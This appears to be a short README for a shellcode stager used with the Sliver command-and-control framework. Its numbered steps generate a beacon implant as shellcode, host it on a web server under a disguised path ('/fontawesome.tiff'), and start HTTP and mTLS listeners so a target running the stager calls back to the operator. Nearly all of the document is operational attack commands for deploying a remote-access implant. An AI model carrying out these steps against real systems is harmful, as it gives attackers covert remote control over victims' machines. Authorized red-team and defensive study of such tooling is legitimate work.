
### Building 

With `just`

```
just all
```

With `make`

```
make
```

### Usage

Edit the target in `config.conf`

```
TARGET=IP:PORT
```

#### Sliver Listeners

##### HTTP with mTLS

Create a test profile for the stager

```
profiles new --mtls YOUR_IP:8443 beacon --skip-symbols --format shellcode showtoon
```

Stage

```
profiles stage showtoon -s shellcode.bin
```

Add implant as content to website

```
websites add-content --content shellcode.bin --web-path /fontawesome.tiff --website test
```

Host the implant

```
http --website test --lport 8080
```

Start the http listener

```
mtls -l 8443
```
